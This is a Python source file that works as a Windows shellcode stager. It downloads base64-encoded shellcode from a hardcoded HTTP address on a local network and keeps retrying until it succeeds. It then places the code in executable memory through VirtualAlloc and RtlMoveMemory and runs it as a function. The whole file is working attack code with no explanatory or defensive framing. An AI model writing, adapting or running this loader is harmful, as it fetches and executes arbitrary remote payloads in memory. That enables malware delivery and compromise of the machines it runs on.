import base64
import ctypes
import time
from urllib.error import URLError
from urllib import request

kernel32 = ctypes.windll.kernel32

def get_code(url):
    while True:
        try:
            with request.urlopen(url) as response:
                shellcode = base64.decodebytes(response.read())
            return shellcode
        except URLError:
            time.sleep(5)

def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (
            ctypes.c_void_p,
            ctypes.c_void_p,
            ctypes.c_size_t)

    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr

def run(shellcode):
    buffer = ctypes.create_string_buffer(shellcode)

    ptr = write_memory(buffer)

    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()

if __name__ == '__main__':
    url = "http://192.168.0.115:8000/shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)
